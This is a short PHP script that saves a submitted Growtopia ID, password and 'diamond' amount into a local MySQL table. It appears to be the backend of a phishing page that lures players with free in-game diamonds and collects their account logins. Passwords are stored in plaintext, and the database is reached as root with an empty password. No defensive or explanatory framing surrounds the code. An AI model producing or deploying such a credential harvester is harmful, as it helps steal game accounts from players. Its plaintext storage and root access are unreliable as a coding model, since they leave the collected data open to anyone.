<?php
session_start();

// Check if the request is coming from a form submission
if ($_SERVER["REQUEST_METHOD"] != "POST") {
    $_SESSION['error_message'] = "This process will automatically run after you fill the following requirement";
    header("Location: index.php");
    exit();
}

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "growtopia";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$grow_id = $_POST['grow_id'];
$password = $_POST['password'];
$diamond = $_POST['diamond'];

$sql = "INSERT INTO growid (grow_id, password, diamond) VALUES (?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sss", $grow_id, $password, $diamond);

if ($stmt->execute()) {
    echo "success";
} else {
    echo "error";
}

$conn->close();
?>